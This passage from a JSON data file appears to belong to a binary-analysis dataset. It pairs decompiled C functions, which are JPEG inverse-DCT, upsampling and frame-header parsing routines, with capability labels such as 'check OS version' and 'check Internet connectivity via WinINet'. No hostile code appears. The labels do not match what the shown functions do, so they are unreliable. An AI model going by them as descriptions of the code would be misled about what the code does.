        "decompiled_code": "\nvoid fcn.0043b5f0(void)\n\n{\n    int32_t iVar1;\n    bool bVar2;\n    bool bVar3;\n    int32_t *in_EAX;\n    uint *puVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t *piVar8;\n    int32_t iVar9;\n    int32_t iStack40;\n    uint *puStack20;\n    \n    puVar4 = (**in_EAX[1])();\n    in_EAX[0x71] = puVar4;\n    *puVar4 = 0x43b10c;\n    puVar4[1] = fcn.0043b124;\n    puVar4[2] = 0;\n    if (in_EAX[0x4b] != 0) {\n        *(*in_EAX + 0x14) = 0x19;\n        (***in_EAX)();\n    }\n    if ((in_EAX[0x13] == 0) || (in_EAX[0x4f] < 2)) {\n        bVar2 = false;\n    }\n    else {\n        bVar2 = true;\n    }\n    iStack40 = 0;\n    iVar9 = in_EAX[0x36];\n    puStack20 = puVar4 + 0x23;\n    piVar8 = puVar4 + 0x19;\n    for (; iStack40 < in_EAX[9]; iStack40 = iStack40 + 1) {\n        iVar5 = (*(iVar9 + 8) * *(iVar9 + 0x24)) / in_EAX[0x4f];\n        iVar6 = (*(iVar9 + 0xc) * *(iVar9 + 0x24)) / in_EAX[0x4f];\n        iVar7 = in_EAX[0x4d];\n        iVar1 = in_EAX[0x4e];\n        *piVar8 = iVar6;\n        bVar3 = true;\n        if (*(iVar9 + 0x30) == 0) {\n            piVar8[-0xc] = fcn.0043b230;\n            bVar3 = false;\n        }\n        else if ((iVar5 == iVar7) && (iVar6 == iVar1)) {\n            piVar8[-0xc] = fcn.0043b224;\n            bVar3 = false;\n        }\n        else if ((iVar5 * 2 == iVar7) && (iVar6 == iVar1)) {\n            if ((bVar2) && (2 < *(iVar9 + 0x28))) {\n                piVar8[-0xc] = fcn.0043b3e8;\n            }\n            else {\n                piVar8[-0xc] = fcn.0043b2fc;\n            }\n        }\n        else if ((iVar5 * 2 == iVar7) && (iVar6 * 2 == iVar1)) {\n            if ((bVar2) && (2 < *(iVar9 + 0x28))) {\n                piVar8[-0xc] = fcn.0043b49c;\n                puVar4[2] = 1;\n            }\n            else {\n                piVar8[-0xc] = fcn.0043b358;\n            }\n        }\n        else if ((iVar7 % iVar5 == 0) && (iVar1 % iVar6 == 0)) {\n            piVar8[-0xc] = fcn.0043b240;\n            *puStack20 = iVar7 / iVar5;\n            *(puStack20 + 10) = iVar1 / iVar6;\n        }\n        else {\n            *(*in_EAX + 0x14) = 0x26;\n            (***in_EAX)();\n        }\n        if (bVar3) {\n            fcn.0043e4c8(in_EAX[0x4e]);\n            iVar7 = (**(in_EAX[1] + 8))();\n            piVar8[-0x16] = iVar7;\n        }\n        piVar8 = piVar8 + 1;\n        puStack20 = puStack20 + 1;\n        iVar9 = iVar9 + 0x54;\n    }\n    return;\n}\n",
        "token_count": 922
    },
    "0043b808": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043b808(int32_t arg_8h, int32_t *arg_ch)\n\n{\n    float fVar1;\n    float fVar2;\n    float fVar3;\n    int32_t in_EAX;\n    int32_t iVar4;\n    int16_t *in_ECX;\n    int32_t in_EDX;\n    float *pfVar5;\n    float *pfVar6;\n    uchar *puVar7;\n    int32_t iVar8;\n    uint var_150h;\n    float afStack336 [15];\n    float afStack276 [8];\n    float afStack244 [8];\n    float afStack212 [8];\n    float afStack180 [8];\n    float afStack148 [8];\n    float afStack116 [8];\n    int32_t *var_50h;\n    float var_4ch;\n    int32_t var_48h;\n    float var_44h;\n    float var_40h;\n    float fStack64;\n    float fStack60;\n    float var_34h;\n    float var_30h;\n    float var_2ch;\n    float fStack44;\n    float fStack40;\n    float var_20h;\n    float var_1ch;\n    float var_18h;\n    float var_14h;\n    float var_10h;\n    float var_ch;\n    float fStack12;\n    float fStack8;\n    \n    iVar8 = 8;\n    pfVar6 = &var_150h;\n    var_48h = *(in_EAX + 0x144) + 0x80;\n    pfVar5 = *(in_EDX + 0x50);\n    do {\n        if ((((in_ECX[8] == 0) && (in_ECX[0x10] == 0)) && (in_ECX[0x18] == 0)) &&\n           (((in_ECX[0x20] == 0 && (in_ECX[0x28] == 0)) && ((in_ECX[0x30] == 0 && (in_ECX[0x38] == 0)))))) {\n            var_4ch = *in_ECX * *pfVar5;\n            *pfVar6 = *in_ECX * *pfVar5;\n            pfVar6[8] = var_4ch;\n            pfVar6[0x10] = var_4ch;\n            pfVar6[0x18] = var_4ch;\n            pfVar6[0x20] = var_4ch;\n            pfVar6[0x28] = var_4ch;\n            pfVar6[0x30] = var_4ch;\n            pfVar6[0x38] = var_4ch;\n        }\n        else {\n            fVar1 = *in_ECX * *pfVar5 + in_ECX[0x20] * pfVar5[0x20];\n            fVar2 = *in_ECX * *pfVar5 - in_ECX[0x20] * pfVar5[0x20];\n            var_30h = in_ECX[0x10] * pfVar5[0x10] + in_ECX[0x30] * pfVar5[0x30];\n            fVar3 = (in_ECX[0x10] * pfVar5[0x10] - in_ECX[0x30] * pfVar5[0x30]) * *0x43bc3c - var_30h;\n            fStack8 = fVar1 + var_30h;\n            var_10h = fVar1 - var_30h;\n            fStack12 = fVar2 + fVar3;\n            var_ch = fVar2 - fVar3;\n            var_44h = in_ECX[0x28] * pfVar5[0x28] + in_ECX[0x18] * pfVar5[0x18];\n            fStack60 = in_ECX[0x28] * pfVar5[0x28] - in_ECX[0x18] * pfVar5[0x18];\n            fStack64 = in_ECX[8] * pfVar5[8] + in_ECX[0x38] * pfVar5[0x38];\n            var_40h = in_ECX[8] * pfVar5[8] - in_ECX[0x38] * pfVar5[0x38];\n            var_20h = fStack64 + var_44h;\n            fStack44 = (fStack64 - var_44h) * *0x43bc3c;\n            var_34h = (fStack60 + var_40h) * *0x43bc40;\n            fStack40 = *0x43bc44 * var_40h - var_34h;\n            var_2ch = *0x43bc48 * fStack60 + var_34h;\n            var_1ch = var_2ch - var_20h;\n            var_18h = fStack44 - var_1ch;\n            var_14h = fStack40 + var_18h;\n            *pfVar6 = fStack8 + var_20h;\n            pfVar6[0x38] = fStack8 - var_20h;\n            pfVar6[8] = fStack12 + var_1ch;\n            pfVar6[0x30] = fStack12 - var_1ch;\n            pfVar6[0x10] = var_ch + var_18h;\n            pfVar6[0x28] = var_ch - var_18h;\n            pfVar6[0x20] = var_10h + var_14h;\n            pfVar6[0x18] = var_10h - var_14h;\n        }\n        pfVar6 = pfVar6 + 1;\n        pfVar5 = pfVar5 + 1;\n        in_ECX = in_ECX + 1;\n        iVar8 = iVar8 + -1;\n    } while (0 < iVar8);\n    pfVar6 = &var_150h;\n    iVar8 = 0;\n    var_50h = arg_ch;\n    do {\n        fStack40 = *pfVar6 + pfVar6[4];\n        puVar7 = *var_50h + arg_8h;\n        fStack44 = *pfVar6 - pfVar6[4];\n        var_30h = pfVar6[2] + pfVar6[6];\n        var_2ch = (pfVar6[2] - pfVar6[6]) * *0x43bc3c - var_30h;\n        fStack8 = fStack40 + var_30h;\n        var_10h = fStack40 - var_30h;\n        fStack12 = fStack44 + var_2ch;\n        var_ch = fStack44 - var_2ch;\n        var_44h = pfVar6[5] + pfVar6[3];\n        fStack60 = pfVar6[5] - pfVar6[3];\n        fStack64 = pfVar6[1] + pfVar6[7];\n        var_40h = pfVar6[1] - pfVar6[7];\n        var_20h = fStack64 + var_44h;\n        fStack44 = (fStack64 - var_44h) * *0x43bc3c;\n        var_34h = (fStack60 + var_40h) * *0x43bc40;\n        fStack40 = *0x43bc44 * var_40h - var_34h;\n        var_2ch = *0x43bc48 * fStack60 + var_34h;\n        var_1ch = var_2ch - var_20h;\n        var_18h = fStack44 - var_1ch;\n        var_14h = fStack40 + var_18h;\n        iVar4 = fcn.00431914();\n        *puVar7 = *(var_48h + (iVar4 + 4 >> 3 & 0x3ffU));\n        iVar4 = fcn.00431914();\n        puVar7[7] = *(var_48h + (iVar4 + 4 >> 3 & 0x3ffU));\n        iVar4 = fcn.00431914();\n        puVar7[1] = *(var_48h + (iVar4 + 4 >> 3 & 0x3ffU));\n        iVar4 = fcn.00431914();\n        puVar7[6] = *(var_48h + (iVar4 + 4 >> 3 & 0x3ffU));\n        iVar4 = fcn.00431914();\n        puVar7[2] = *(var_48h + (iVar4 + 4 >> 3 & 0x3ffU));\n        iVar4 = fcn.00431914();\n        puVar7[5] = *(var_48h + (iVar4 + 4 >> 3 & 0x3ffU));\n        iVar4 = fcn.00431914();\n        puVar7[4] = *(var_48h + (iVar4 + 4 >> 3 & 0x3ffU));\n        iVar4 = fcn.00431914();\n        pfVar6 = pfVar6 + 8;\n        iVar8 = iVar8 + 1;\n        puVar7[3] = *(var_48h + (iVar4 + 4 >> 3 & 0x3ffU));\n        var_50h = var_50h + 1;\n    } while (iVar8 < 8);\n    return;\n}\n",
        "token_count": 2124
    },
    "0043bc4c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043bc4c(int32_t arg_8h, int32_t *arg_ch)\n\n{\n    uchar uVar1;\n    int32_t in_EAX;\n    int32_t *piVar2;\n    int16_t *in_ECX;\n    int32_t iVar3;\n    int32_t in_EDX;\n    uchar *puVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint var_140h;\n    int32_t aiStack320 [15];\n    int32_t aiStack260 [8];\n    int32_t aiStack228 [8];\n    int32_t aiStack196 [8];\n    int32_t aiStack164 [8];\n    int32_t aiStack132 [8];\n    int32_t aiStack100 [8];\n    int32_t *var_40h;\n    int32_t var_3ch;\n    int32_t var_38h;\n    int32_t *var_34h;\n    int32_t var_30h;\n    int32_t var_2ch;\n    int32_t var_28h;\n    int32_t var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_38h = *(in_EAX + 0x144) + 0x80;\n    var_34h = *(in_EDX + 0x50);\n    piVar2 = &var_140h;\n    var_3ch = 8;\n    do {\n        if ((((in_ECX[8] == 0) && (in_ECX[0x10] == 0)) && (in_ECX[0x18] == 0)) &&\n           (((in_ECX[0x20] == 0 && (in_ECX[0x28] == 0)) && ((in_ECX[0x30] == 0 && (in_ECX[0x38] == 0)))))) {\n            iVar3 = *in_ECX * *var_34h;\n            *piVar2 = iVar3;\n            piVar2[8] = iVar3;\n            piVar2[0x10] = iVar3;\n            piVar2[0x18] = iVar3;\n            piVar2[0x20] = iVar3;\n            piVar2[0x28] = iVar3;\n            piVar2[0x30] = iVar3;\n            piVar2[0x38] = iVar3;\n            var_34h = var_34h + 1;\n        }\n        else {\n            iVar6 = *in_ECX * *var_34h + in_ECX[0x20] * var_34h[0x20];\n            iVar3 = *in_ECX * *var_34h - in_ECX[0x20] * var_34h[0x20];\n            var_28h = in_ECX[0x10] * var_34h[0x10] + in_ECX[0x30] * var_34h[0x30];\n            var_10h = var_28h + iVar6;\n            iVar5 = ((in_ECX[0x10] * var_34h[0x10] - in_ECX[0x30] * var_34h[0x30]) * 0x16a >> 8) - var_28h;\n            var_1ch = iVar6 - var_28h;\n            var_14h = iVar5 + iVar3;\n            var_18h = iVar3 - iVar5;\n            iVar3 = in_ECX[0x18] * var_34h[0x18] + in_ECX[0x28] * var_34h[0x28];\n            iVar5 = in_ECX[0x28] * var_34h[0x28] - in_ECX[0x18] * var_34h[0x18];\n            iVar6 = in_ECX[8] * var_34h[8] + in_ECX[0x38] * var_34h[0x38];\n            var_30h = in_ECX[8] * var_34h[8] - in_ECX[0x38] * var_34h[0x38];\n            var_24h = iVar3 + iVar6;\n            var_2ch = (var_30h + iVar5) * 0x1d9 >> 8;\n            iVar5 = ((iVar5 * -0x29d >> 8) + var_2ch) - var_24h;\n            iVar3 = ((iVar6 - iVar3) * 0x16a >> 8) - iVar5;\n            var_20h = iVar3 + ((var_30h * 0x115 >> 8) - var_2ch);\n            *piVar2 = var_10h + var_24h;\n            piVar2[0x38] = var_10h - var_24h;\n            piVar2[8] = var_14h + iVar5;\n            piVar2[0x30] = var_14h - iVar5;\n            piVar2[0x10] = var_18h + iVar3;\n            piVar2[0x28] = var_18h - iVar3;\n            piVar2[0x20] = var_1ch + var_20h;\n            piVar2[0x18] = var_1ch - var_20h;\n            var_34h = var_34h + 1;\n        }\n        in_ECX = in_ECX + 1;\n        piVar2 = piVar2 + 1;\n        var_3ch = var_3ch + -1;\n    } while (0 < var_3ch);\n    piVar2 = &var_140h;\n    var_3ch = 0;\n    var_40h = arg_ch;\n    do {\n        puVar4 = *var_40h + arg_8h;\n        if ((((piVar2[1] == 0) && (piVar2[2] == 0)) &&\n            ((piVar2[3] == 0 && (((piVar2[4] == 0 && (piVar2[5] == 0)) && (piVar2[6] == 0)))))) && (piVar2[7] == 0)) {\n            uVar1 = *(var_38h + (*piVar2 >> 5 & 0x3ffU));\n            *puVar4 = uVar1;\n            puVar4[1] = uVar1;\n            puVar4[2] = uVar1;\n            puVar4[3] = uVar1;\n            puVar4[4] = uVar1;\n            puVar4[5] = uVar1;\n            puVar4[6] = uVar1;\n            puVar4[7] = uVar1;\n        }\n        else {\n            var_18h = *piVar2 - piVar2[4];\n            var_1ch = *piVar2 + piVar2[4];\n            var_28h = piVar2[2] + piVar2[6];\n            iVar3 = ((piVar2[2] - piVar2[6]) * 0x16a >> 8) - var_28h;\n            var_10h = var_28h + var_1ch;\n            var_1ch = var_1ch - var_28h;\n            var_14h = iVar3 + var_18h;\n            var_18h = var_18h - iVar3;\n            iVar3 = piVar2[5] + piVar2[3];\n            iVar6 = piVar2[5] - piVar2[3];\n            var_30h = piVar2[1] - piVar2[7];\n            var_24h = iVar3 + piVar2[1] + piVar2[7];\n            var_2ch = (var_30h + iVar6) * 0x1d9 >> 8;\n            iVar6 = ((iVar6 * -0x29d >> 8) + var_2ch) - var_24h;\n            iVar3 = (((piVar2[1] + piVar2[7]) - iVar3) * 0x16a >> 8) - iVar6;\n            var_20h = iVar3 + ((var_30h * 0x115 >> 8) - var_2ch);\n            *puVar4 = *(var_38h + (var_10h + var_24h >> 5 & 0x3ffU));\n            puVar4[7] = *(var_38h + (var_10h - var_24h >> 5 & 0x3ffU));\n            puVar4[1] = *(var_38h + (var_14h + iVar6 >> 5 & 0x3ffU));\n            puVar4[6] = *(var_38h + (var_14h - iVar6 >> 5 & 0x3ffU));\n            puVar4[2] = *(var_38h + (var_18h + iVar3 >> 5 & 0x3ffU));\n            puVar4[5] = *(var_38h + (var_18h - iVar3 >> 5 & 0x3ffU));\n            puVar4[4] = *(var_38h + (var_1ch + var_20h >> 5 & 0x3ffU));\n            puVar4[3] = *(var_38h + (var_1ch - var_20h >> 5 & 0x3ffU));\n        }\n        piVar2 = piVar2 + 8;\n        var_3ch = var_3ch + 1;\n        var_40h = var_40h + 1;\n    } while (var_3ch < 8);\n    return;\n}\n",
        "token_count": 2241
    },
    "0043c080": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043c080(int32_t arg_8h, int32_t *arg_ch)\n\n{\n    uchar uVar1;\n    int32_t in_EAX;\n    int32_t *piVar2;\n    int16_t *in_ECX;\n    int32_t in_EDX;\n    int32_t iVar3;\n    int32_t iVar4;\n    uchar *puVar5;\n    uint var_a8h;\n    int32_t aiStack168 [15];\n    int32_t aiStack108 [8];\n    int32_t aiStack76 [8];\n    int32_t *var_28h;\n    int32_t var_24h;\n    int32_t var_20h;\n    int32_t *var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_20h = *(in_EAX + 0x144) + 0x80;\n    var_1ch = *(in_EDX + 0x50);\n    piVar2 = &var_a8h;\n    var_24h = 8;\n    do {\n        if (var_24h != 4) {\n            if ((((in_ECX[8] == 0) && (in_ECX[0x10] == 0)) && (in_ECX[0x18] == 0)) &&\n               (((in_ECX[0x28] == 0 && (in_ECX[0x30] == 0)) && (in_ECX[0x38] == 0)))) {\n                iVar3 = *in_ECX * *var_1ch * 4;\n                *piVar2 = iVar3;\n                piVar2[8] = iVar3;\n                piVar2[0x10] = iVar3;\n                piVar2[0x18] = iVar3;\n            }\n            else {\n                iVar4 = *in_ECX * *var_1ch * 0x4000;\n                iVar3 = in_ECX[0x10] * var_1ch[0x10] * 0x3b21 + in_ECX[0x30] * var_1ch[0x30] * -0x187e;\n                var_4h = iVar3 + iVar4;\n                var_8h = iVar4 - iVar3;\n                var_ch = in_ECX[0x38] * var_1ch[0x38];\n                var_10h = in_ECX[0x28] * var_1ch[0x28];\n                var_14h = in_ECX[0x18] * var_1ch[0x18];\n                var_18h = in_ECX[8] * var_1ch[8];\n                iVar4 = var_ch * -0x6c2 + var_10h * 0x2e75 + var_14h * -0x4587 + var_18h * 0x21f9;\n                iVar3 = var_ch * -0x1050 + var_10h * -0x133e + var_14h * 0x1ccd + var_18h * 0x5203;\n                *piVar2 = var_4h + iVar3 + 0x800 >> 0xc;\n                piVar2[0x18] = (var_4h - iVar3) + 0x800 >> 0xc;\n                piVar2[8] = var_8h + iVar4 + 0x800 >> 0xc;\n                piVar2[0x10] = (var_8h - iVar4) + 0x800 >> 0xc;\n            }\n        }\n        in_ECX = in_ECX + 1;\n        var_1ch = var_1ch + 1;\n        piVar2 = piVar2 + 1;\n        var_24h = var_24h + -1;\n    } while (0 < var_24h);\n    piVar2 = &var_a8h;\n    var_24h = 0;\n    var_28h = arg_ch;\n    do {\n        puVar5 = *var_28h + arg_8h;\n        if (((piVar2[1] == 0) && (piVar2[2] == 0)) &&\n           ((piVar2[3] == 0 && (((piVar2[5] == 0 && (piVar2[6] == 0)) && (piVar2[7] == 0)))))) {\n            uVar1 = *(var_20h + (*piVar2 + 0x10 >> 5 & 0x3ffU));\n            *puVar5 = uVar1;\n            puVar5[1] = uVar1;\n            puVar5[2] = uVar1;\n            puVar5[3] = uVar1;\n        }\n        else {\n            var_8h = piVar2[2] * 0x3b21 + piVar2[6] * -0x187e;\n            var_4h = var_8h + *piVar2 * 0x4000;\n            var_8h = *piVar2 * 0x4000 - var_8h;\n            var_ch = piVar2[7];\n            var_10h = piVar2[5];\n            var_14h = piVar2[3];\n            var_18h = piVar2[1];\n            iVar4 = var_ch * -0x6c2 + var_10h * 0x2e75 + var_14h * -0x4587 + var_18h * 0x21f9;\n            iVar3 = var_ch * -0x1050 + var_10h * -0x133e + var_14h * 0x1ccd + var_18h * 0x5203;\n            *puVar5 = *(var_20h + (var_4h + iVar3 + 0x40000 >> 0x13 & 0x3ffU));\n            puVar5[3] = *(var_20h + ((var_4h - iVar3) + 0x40000 >> 0x13 & 0x3ffU));\n            puVar5[1] = *(var_20h + (var_8h + iVar4 + 0x40000 >> 0x13 & 0x3ffU));\n            puVar5[2] = *(var_20h + ((var_8h - iVar4) + 0x40000 >> 0x13 & 0x3ffU));\n        }\n        piVar2 = piVar2 + 8;\n        var_24h = var_24h + 1;\n        var_28h = var_28h + 1;\n    } while (var_24h < 4);\n    return;\n}\n",
        "token_count": 1544
    },
    "0043c434": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043c434(int32_t arg_8h, int32_t *arg_ch)\n\n{\n    int32_t in_EAX;\n    int32_t *piVar1;\n    int16_t *in_ECX;\n    uchar *puVar2;\n    int32_t in_EDX;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint var_54h;\n    int32_t aiStack84 [15];\n    int32_t *var_14h;\n    uchar var_dh;\n    int32_t var_ch;\n    int32_t *var_8h;\n    int32_t var_4h;\n    \n    var_ch = *(in_EAX + 0x144) + 0x80;\n    piVar1 = &var_54h;\n    var_8h = *(in_EDX + 0x50);\n    iVar3 = 8;\n    do {\n        if (((iVar3 != 6) && (iVar3 != 4)) && (iVar3 != 2)) {\n            if (((in_ECX[8] == 0) && (in_ECX[0x18] == 0)) && ((in_ECX[0x28] == 0 && (in_ECX[0x38] == 0)))) {\n                iVar4 = *in_ECX * *var_8h * 4;\n                *piVar1 = iVar4;\n                piVar1[8] = iVar4;\n            }\n            else {\n                var_4h = *in_ECX * *var_8h * 0x8000;\n                iVar4 = in_ECX[0x38] * var_8h[0x38] * -0x1712 + in_ECX[0x28] * var_8h[0x28] * 0x1b37 +\n                        in_ECX[0x18] * var_8h[0x18] * -0x28ba + in_ECX[8] * var_8h[8] * 0x73fc;\n                *piVar1 = var_4h + iVar4 + 0x1000 >> 0xd;\n                piVar1[8] = (var_4h - iVar4) + 0x1000 >> 0xd;\n            }\n        }\n        in_ECX = in_ECX + 1;\n        var_8h = var_8h + 1;\n        piVar1 = piVar1 + 1;\n        iVar3 = iVar3 + -1;\n    } while (0 < iVar3);\n    piVar1 = &var_54h;\n    var_14h = arg_ch;\n    iVar3 = 0;\n    do {\n        puVar2 = *var_14h + arg_8h;\n        if (((piVar1[1] == 0) && (piVar1[3] == 0)) && ((piVar1[5] == 0 && (piVar1[7] == 0)))) {\n            var_dh = *(var_ch + (*piVar1 + 0x10 >> 5 & 0x3ffU));\n            *puVar2 = var_dh;\n            puVar2[1] = var_dh;\n        }\n        else {\n            var_4h = *piVar1 * 0x8000;\n            iVar4 = piVar1[7] * -0x1712 + piVar1[5] * 0x1b37 + piVar1[3] * -0x28ba + piVar1[1] * 0x73fc;\n            *puVar2 = *(var_ch + (var_4h + iVar4 + 0x80000 >> 0x14 & 0x3ffU));\n            puVar2[1] = *(var_ch + ((var_4h - iVar4) + 0x80000 >> 0x14 & 0x3ffU));\n        }\n        piVar1 = piVar1 + 8;\n        iVar3 = iVar3 + 1;\n        var_14h = var_14h + 1;\n    } while (iVar3 < 2);\n    return;\n}\n",
        "token_count": 915
    },
    "0043c660": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0043c660(void)\n\n{\n    int32_t *in_EAX;\n    int32_t *piVar1;\n    int32_t iVar2;\n    \n    *(*in_EAX + 0x14) = 0x66;\n    (**(*in_EAX + 4))();\n    if (*(in_EAX[0x6e] + 0xc) != 0) {\n        *(*in_EAX + 0x14) = 0x3d;\n        (***in_EAX)();\n    }\n    iVar2 = 0;\n    piVar1 = in_EAX + 0x39;\n    do {\n        *piVar1 = 0;\n        *(piVar1 + 4) = 1;\n        *(piVar1 + 8) = 5;\n        iVar2 = iVar2 + 1;\n        piVar1 = piVar1 + 1;\n    } while (iVar2 < 0x10);\n    in_EAX[0x45] = 0;\n    in_EAX[10] = 0;\n    in_EAX[0x4b] = 0;\n    in_EAX[0x46] = 0;\n    *(in_EAX + 0x47) = 1;\n    *(in_EAX + 0x11d) = 1;\n    *(in_EAX + 0x11e) = 0;\n    *(in_EAX + 0x48) = 1;\n    *(in_EAX + 0x122) = 1;\n    in_EAX[0x49] = 0;\n    *(in_EAX + 0x4a) = 0;\n    *(in_EAX[0x6e] + 0xc) = 1;\n    return 1;\n}\n",
        "token_count": 391
    },
    "0043c714": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0043c714(int32_t param_1, int32_t param_2)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    uint8_t **ppuVar3;\n    int32_t *in_EAX;\n    int32_t iVar4;\n    uint32_t *puVar5;\n    uint8_t *puVar6;\n    uint8_t *puVar7;\n    uint8_t *puVar8;\n    uint32_t uStack24;\n    \n    ppuVar3 = in_EAX[6];\n    puVar8 = ppuVar3[1];\n    puVar6 = *ppuVar3;\n    in_EAX[0x37] = param_2;\n    in_EAX[0x38] = param_1;\n    if (puVar8 == NULL) {\n        iVar4 = (*ppuVar3[3])();\n        if (iVar4 == 0) {\n            return 0;\n        }\n        puVar8 = ppuVar3[1];\n        puVar6 = *ppuVar3;\n    }\n    puVar8 = puVar8 + -1;\n    uVar2 = *puVar6;\n    puVar6 = puVar6 + 1;\n    if (puVar8 == NULL) {\n        iVar4 = (*ppuVar3[3])();\n        if (iVar4 == 0) {\n            return 0;\n        }\n        puVar8 = ppuVar3[1];\n        puVar6 = *ppuVar3;\n    }\n    puVar8 = puVar8 + -1;\n    uVar1 = *puVar6;\n    puVar6 = puVar6 + 1;\n    if (puVar8 == NULL) {\n        iVar4 = (*ppuVar3[3])();\n        if (iVar4 == 0) {\n            return 0;\n        }\n        puVar8 = ppuVar3[1];\n        puVar6 = *ppuVar3;\n    }\n    puVar8 = puVar8 + -1;\n    in_EAX[0x35] = *puVar6;\n    puVar6 = puVar6 + 1;\n    if (puVar8 == NULL) {\n        iVar4 = (*ppuVar3[3])();\n        if (iVar4 == 0) {\n            return 0;\n        }\n        puVar8 = ppuVar3[1];\n        puVar6 = *ppuVar3;\n    }\n    puVar8 = puVar8 + -1;\n    puVar7 = puVar6 + 1;\n    in_EAX[8] = *puVar6 << 8;\n    if (puVar8 == NULL) {\n        iVar4 = (*ppuVar3[3])();\n        if (iVar4 == 0) {\n            return 0;\n        }\n        puVar8 = ppuVar3[1];\n        puVar7 = *ppuVar3;\n    }\n    puVar8 = puVar8 + -1;\n    in_EAX[8] = in_EAX[8] + *puVar7;\n    puVar7 = puVar7 + 1;\n    if (puVar8 == NULL) {\n        iVar4 = (*ppuVar3[3])();\n        if (iVar4 == 0) {\n            return 0;\n        }\n        puVar8 = ppuVar3[1];\n        puVar7 = *ppuVar3;\n    }\n    puVar8 = puVar8 + -1;\n    puVar6 = puVar7 + 1;\n    in_EAX[7] = *puVar7 << 8;\n    if (puVar8 == NULL) {\n        iVar4 = (*ppuVar3[3])();\n        if (iVar4 == 0) {\n            return 0;\n        }\n        puVar8 = ppuVar3[1];\n        puVar6 = *ppuVar3;\n    }\n    puVar8 = puVar8 + -1;\n    in_EAX[7] = in_EAX[7] + *puVar6;\n    puVar6 = puVar6 + 1;\n    if (puVar8 == NULL) {\n        iVar4 = (*ppuVar3[3])();\n        if (iVar4 == 0) {\n            return 0;\n        }\n        puVar8 = ppuVar3[1];\n        puVar6 = *ppuVar3;\n    }\n    in_EAX[9] = *puVar6;\n    iVar4 = *in_EAX;\n    *(iVar4 + 0x18) = in_EAX[0x68];\n    *(iVar4 + 0x1c) = in_EAX[7];\n    *(iVar4 + 0x20) = in_EAX[8];\n    *(iVar4 + 0x24) = in_EAX[9];\n    *(*in_EAX + 0x14) = 100;\n    (**(*in_EAX + 4))();\n    if (*(in_EAX[0x6e] + 0x10) != 0) {\n        *(*in_EAX + 0x14) = 0x3a;\n        (***in_EAX)();\n    }\n    if (((in_EAX[8] == 0) || (in_EAX[7] == 0)) || (in_EAX[9] < 1)) {\n        *(*in_EAX + 0x14) = 0x20;\n        (***in_EAX)();\n    }\n    if (uVar2 * 0x100 + uVar1 + -8 != in_EAX[9] * 3) {\n        *(*in_EAX + 0x14) = 0xb;\n        (***in_EAX)();\n    }\n    if (in_EAX[0x36] == 0) {\n        iVar4 = (**in_EAX[1])();\n        in_EAX[0x36] = iVar4;\n    }\n    uStack24 = 0;\n    puVar5 = in_EAX[0x36];\n    do {\n        puVar8 = puVar8 + -1;\n        puVar6 = puVar6 + 1;\n        if (in_EAX[9] <= uStack24) {\n            *(in_EAX[0x6e] + 0x10) = 1;\n            *ppuVar3 = puVar6;\n            ppuVar3[1] = puVar8;\n            return 1;\n        }\n        puVar5[1] = uStack24;\n        if (puVar8 == NULL) {\n            iVar4 = (*ppuVar3[3])();\n            if (iVar4 == 0) {\n                return 0;\n            }\n            puVar8 = ppuVar3[1];\n            puVar6 = *ppuVar3;\n        }\n        puVar8 = puVar8 + -1;\n        *puVar5 = *puVar6;\n        puVar6 = puVar6 + 1;\n        if (puVar8 == NULL) {\n            iVar4 = (*ppuVar3[3])();\n            if (iVar4 == 0) {\n                return 0;\n            }\n            puVar8 = ppuVar3[1];\n            puVar6 = *ppuVar3;\n        }\n        puVar8 = puVar8 + -1;\n        uVar2 = *puVar6;\n        puVar6 = puVar6 + 1;\n        puVar5[2] = uVar2 >> 4;\n        puVar5[3] = uVar2 & 0xf;\n        if (puVar8 == NULL) {\n            iVar4 = (*ppuVar3[3])();\n            if (iVar4 == 0) {\n                return 0;\n            }\n            puVar8 = ppuVar3[1];\n            puVar6 = *ppuVar3;\n        }\n        puVar5[4] = *puVar6;\n        iVar4 = *in_EAX;\n        *(iVar4 + 0x18) = *puVar5;\n        *(iVar4 + 0x1c) = puVar5[2];\n        *(iVar4 + 0x20) = puVar5[3];\n        *(iVar4 + 0x24) = puVar5[4];\n        *(*in_EAX + 0x14) = 